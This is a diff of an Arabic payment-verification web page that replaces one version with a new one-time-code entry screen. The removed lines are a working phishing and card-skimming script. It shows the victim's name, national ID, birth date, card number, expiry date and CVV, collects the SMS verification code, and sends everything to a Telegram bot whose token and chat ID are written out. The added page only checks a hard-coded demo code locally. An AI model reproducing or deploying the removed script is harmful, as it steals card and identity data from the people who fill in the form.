@@ -1,183 +1,271 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التحقق من الدفع</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>إدخال رمز التحقق</title>
   <style>
-    /* الأساسيات */
-    body {
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      background-color: #f5f5f5;
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+    :root{
+      --bg: #f4f7fb;
+      --card: #fff;
+      --primary: #0b61c2;
+      --accent: #004080;
+      --muted: #6b7280;
+      --success: #16a34a;
+      --danger: #dc2626;
+      --shadow: 0 10px 30px rgba(2,6,23,0.08);
+      --radius: 12px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: "Segoe UI", Tahoma, Arial, "Noto Naskh Arabic", sans-serif;
+      background: linear-gradient(180deg,var(--bg),#eef4ff);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+      color:#111827;
+      direction:rtl;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
 
-    header, footer {
-      background-color: #004080;
-      color: white;
-      text-align: center;
-      padding: 20px;
+    .card{
+      width:100%;
+      max-width:520px;
+      background:var(--card);
+      border-radius:var(--radius);
+      box-shadow:var(--shadow);
+      padding:22px;
+      overflow:hidden;
     }
 
-    main {
-      padding: 20px;
+    header{
+      display:flex;
+      align-items:center;
+      gap:14px;
+      margin-bottom:10px;
+    }
+    .brand{
+      width:56px;height:56px;border-radius:10px;background:linear-gradient(135deg,var(--primary),var(--accent));
+      display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:18px;
+      box-shadow:0 6px 18px rgba(11,97,194,0.12);
+    }
+    h1{margin:0;font-size:18px;color:var(--accent)}
+    p.lead{margin:8px 0 16px;color:var(--muted);font-size:14px;line-height:1.4}
+
+    /* OTP grid */
+    .otp-grid{
+      display:flex;
+      gap:10px;
+      justify-content:center;
+      margin:12px 0 6px;
+    }
+    .otp-input{
+      width:64px;
+      height:64px;
+      border-radius:10px;
+      border:1px solid #e6eefc;
+      background:#fbfeff;
+      text-align:center;
+      font-size:22px;
+      font-weight:700;
+      caret-color:transparent;
+      transition:transform .12s ease, box-shadow .12s ease, border-color .12s ease;
+    }
+    .otp-input:focus{
+      outline:none;
+      transform:translateY(-3px);
+      box-shadow:0 8px 20px rgba(11,97,194,0.10);
+      border-color:var(--accent);
     }
 
-    .container {
-      background-color: white;
-      padding: 20px;
-      border-radius: 8px;
-      max-width: 600px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    .meta{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-top:12px;
+      gap:10px;
+    }
+    .timer{font-weight:700;color:var(--muted)}
+    .help{font-size:13px;color:var(--muted)}
+
+    .actions{display:flex;gap:10px;margin-top:18px}
+    .btn{
+      flex:1;padding:12px;border-radius:10px;border:0;font-weight:800;background:var(--accent);color:#fff;cursor:pointer;
+      transition:transform .08s ease;
+    }
+    .btn:active{transform:translateY(1px)}
+    .btn.ghost{background:transparent;color:var(--accent);border:1px solid #d7e6ff;font-weight:700}
+
+    .status{margin-top:12px;text-align:center;font-size:14px;color:var(--muted);min-height:20px}
+
+    /* small screens */
+    @media (max-width:420px){
+      .otp-input{width:46px;height:52px;font-size:20px}
+      .brand{width:48px;height:48px;font-size:16px}
     }
 
-    .info {
-      margin-top: 20px;
-      font-size: 16px;
+    /* subtle shake */
+    @keyframes shake {
+      0%{ transform: translateX(0) }
+      20%{ transform: translateX(-6px) }
+      40%{ transform: translateX(6px) }
+      60%{ transform: translateX(-4px) }
+      80%{ transform: translateX(4px) }
+      100%{ transform: translateX(0) }
     }
-
-    .info p {
-      margin: 10px 0;
-    }
-
-    .highlight {
-      font-weight: bold;
-      color: #004080;
-    }
-
-    button {
-      padding: 12px;
-      width: 100%;
-      background-color: #004080;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-
-    button:hover {
-      background-color: #003366;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 14px;
-    }
-
-    /* تنسيق الهاتف والتابلت */
-    @media only screen and (max-width: 600px) {
-      .container {
-        padding: 15px;
-      }
-
-      header, footer {
-        padding: 10px;
-      }
-
-      button {
-        font-size: 14px;
-      }
-    }
+    .shake{animation:shake .42s ease both}
   </style>
 </head>
 <body>
-
-  <header>
-    <h2>التحقق من الدفع</h2>
-  </header>
-
-  <main>
-    <div class="container">
-      <h3>مراجعة بيانات الدفع</h3>
-
-      <div class="info">
-        <p><span class="highlight">الاسم:</span> <span id="name"></span></p>
-        <p><span class="highlight">رقم الهوية:</span> <span id="idNumber"></span></p>
-        <p><span class="highlight">تاريخ الميلاد:</span> <span id="dob"></span></p>
-        <p><span class="highlight">رقم البطاقة:</span> <span id="cardNumber"></span></p>
-        <p><span class="highlight">تاريخ الصلاحية:</span> <span id="expiryDate"></span></p>
-        <p><span class="highlight">CVV:</span> <span id="cvv"></span></p>
-        <p><span class="highlight">المبلغ المدفوع:</span> <span id="amount"></span> درهم</p>
+  <main class="card" role="main" aria-labelledby="title">
+    <header>
+      <div class="brand" aria-hidden="true">OTP</div>
+      <div>
+        <h1 id="title">أدخل رمز التحقق</h1>
+        <p class="lead">فضلاً أدخل رمز التحقق المكوّن من <strong>6 أرقام</strong> المرسل إلى جوالك. يمكنك لصق الرمز كاملاً.</p>
       </div>
+    </header>
 
-      <!-- إضافة حقل إدخال كود التحقق -->
-      <label for="verificationCode">أدخل كود التحقق:</label>
-      <input type="text" id="verificationCode" placeholder="أدخل كود التحقق" required />
-
-      <button id="confirmBtn">تأكيد الدفع</button>
+    <div class="otp-grid" aria-label="حقول رمز التحقق" id="otpGrid">
+      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d1" aria-label="رقم 1"/>
+      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d2" aria-label="رقم 2"/>
+      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d3" aria-label="رقم 3"/>
+      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d4" aria-label="رقم 4"/>
+      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d5" aria-label="رقم 5"/>
+      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d6" aria-label="رقم 6"/>
     </div>
+
+    <div class="meta" role="status" aria-live="polite">
+      <div class="help">لم يصلك الرمز؟ يمكنك إعادة الإرسال بعد انتهاء العداد.</div>
+      <div class="timer" id="timer">00:30</div>
+    </div>
+
+    <div class="actions">
+      <button class="btn" id="verifyBtn" aria-label="تحقق من الرمز">تحقق</button>
+      <button class="btn ghost" id="resendBtn" aria-label="إعادة إرسال" disabled>إعادة إرسال</button>
+    </div>
+
+    <div class="status" id="statusArea" aria-live="polite"></div>
   </main>
 
-  <footer>
-    جميع الحقوق محفوظة © 2025
-  </footer>
+<script>
+/* سلوك الحقول واللصق والتركيز والعداد */
+(function(){
+  const inputs = Array.from(document.querySelectorAll('.otp-input'));
+  const verifyBtn = document.getElementById('verifyBtn');
+  const resendBtn = document.getElementById('resendBtn');
+  const statusArea = document.getElementById('statusArea');
+  const timerEl = document.getElementById('timer');
 
-  <script>
-    // استرجاع البيانات المخزنة من الجلسة السابقة
-    const formData = JSON.parse(sessionStorage.getItem('formData'));
+  // demo code for local testing (you can ignore/change it)
+  const DEMO_CODE = '123456';
 
-    document.getElementById('name').textContent = formData.fullName;
-    document.getElementById('idNumber').textContent = formData.idNumber;
-    document.getElementById('dob').textContent = formData.dob;
-    document.getElementById('cardNumber').textContent = formData.cardNumber;
-    document.getElementById('expiryDate').textContent = `${formData.expiryMonth}/${formData.expiryYear}`;
-    document.getElementById('cvv').textContent = formData.cvv;
-    document.getElementById('amount').textContent = formData.amount;
+  // helpers
+  function setStatus(msg, ok){
+    statusArea.textContent = msg || '';
+    statusArea.style.color = ok ? 'var(--success)' : ok === false ? 'var(--danger)' : 'var(--muted)';
+  }
 
-    document.getElementById('confirmBtn').addEventListener('click', function() {
-      const verificationCode = document.getElementById('verificationCode').value.trim();
+  function getCode(){ return inputs.map(i=>i.value.trim()).join(''); }
+  function clearInputs(){ inputs.forEach(i=> i.value=''); inputs[0].focus(); }
 
-      if (!verificationCode) {
-        alert("❗ الرجاء إدخال كود التحقق.");
-        return;
-      }
-
-      // إنشاء الرسالة لإرسالها إلى البوت
-      const message = `
-✅ تم تأكيد الدفع بنجاح!
------------------------------------
-👤 الاسم: ${formData.fullName}
-🆔 رقم الهوية: ${formData.idNumber}
-📅 تاريخ الميلاد: ${formData.dob}
-📄 رقم البطاقة: ${formData.cardNumber}
-📆 تاريخ الصلاحية: ${formData.expiryMonth}/${formData.expiryYear}
-🔐 CVV: ${formData.cvv}
-💵 المبلغ المدفوع: ${formData.amount} درهم
-🔑 كود التحقق: ${verificationCode}
-`;
-
-      // إرسال الرسالة إلى بوت التلغرام
-      fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "8404960059",  // معرف المحادثة
-          text: message
-        })
-      })
-      .then(() => {
-        alert("تم إرسال بيانات الدفع بنجاح!");
-      })
-      .catch(() => {
-        alert("❌ فشل الإرسال إلى البوت");
-      });
-
-      // الانتقال إلى صفحة التأكيد النهائي أو إتمام العملية
-      window.location.href = "thank_you.html";  // هنا يمكن وضع صفحة شكرًا بعد الدفع
+  /* automatic focus move */
+  inputs.forEach((input, idx) => {
+    input.addEventListener('input', (e) => {
+      const v = e.target.value.replace(/\D/g,'').slice(0,1);
+      e.target.value = v;
+      if(v && idx < inputs.length-1) inputs[idx+1].focus();
+      setStatus('');
     });
-  </script>
 
+    input.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !e.target.value && idx > 0){
+        inputs[idx-1].focus();
+      }
+      // allow paste via ctrl/cmd+v (handled in paste event)
+    });
+
+    input.addEventListener('paste', (ev) => {
+      ev.preventDefault();
+      const paste = (ev.clipboardData || window.clipboardData).getData('text') || '';
+      const digits = paste.replace(/\D/g,'').slice(0, inputs.length).split('');
+      digits.forEach((d,i)=> { inputs[i].value = d; });
+      const nextIndex = Math.min(digits.length, inputs.length-1);
+      inputs[nextIndex].focus();
+      setStatus('');
+    });
+  });
+
+  // place focus on first field on load
+  window.addEventListener('load', ()=> inputs[0].focus());
+
+  // verify logic (local)
+  verifyBtn.addEventListener('click', () => {
+    const code = getCode();
+    if(code.length !== inputs.length){
+      setStatus('الرجاء إدخال جميع الأرقام (6).', false);
+      animateShake();
+      return;
+    }
+
+    // demo verification - replace with real check if needed
+    if(code === DEMO_CODE){
+      setStatus('✅ تم التحقق بنجاح — شكراً', true);
+      // success behavior: you can redirect or show modal
+      setTimeout(()=> { setStatus('إعادة ضبط الحقول للاختبار...', null); clearInputs(); }, 900);
+    } else {
+      setStatus('❌ الرمز غير صحيح، حاول مجدداً.', false);
+      animateShake();
+      // clear last input for retry
+      inputs.forEach(i => i.classList.add('shake'));
+      setTimeout(()=> inputs.forEach(i => i.classList.remove('shake')), 420);
+    }
+  });
+
+  function animateShake(){
+    inputs.forEach(i => i.classList.add('shake'));
+    setTimeout(()=> inputs.forEach(i => i.classList.remove('shake')), 420);
+  }
+
+  // resend timer
+  let countdown = 30;
+  let interval = setInterval(tick, 1000);
+  function tick(){
+    if(countdown <= 0){
+      clearInterval(interval);
+      timerEl.textContent = '00:00';
+      resendBtn.disabled = false;
+      return;
+    }
+    const mm = String(Math.floor(countdown/60)).padStart(2,'0');
+    const ss = String(countdown%60).padStart(2,'0');
+    timerEl.textContent = `${mm}:${ss}`;
+    countdown--;
+  }
+
+  resendBtn.addEventListener('click', (e)=>{
+    e.preventDefault();
+    if(resendBtn.disabled) return;
+    // local resend simulation
+    setStatus('تم إرسال رمز جديد (اختبار محلي).', true);
+    // restart timer
+    countdown = 30;
+    resendBtn.disabled = true;
+    interval = setInterval(tick, 1000);
+    // For testing, you can also autofill DEMO_CODE or notify user
+    // inputs.forEach((el,i)=> el.value = DEMO_CODE.charAt(i));
+  });
+
+  // accessibility: allow Enter to submit when focused in last input
+  inputs[inputs.length-1].addEventListener('keyup', (e) => {
+    if(e.key === 'Enter') verifyBtn.click();
+  });
+
+})();
+</script>
 </body>
 </html>
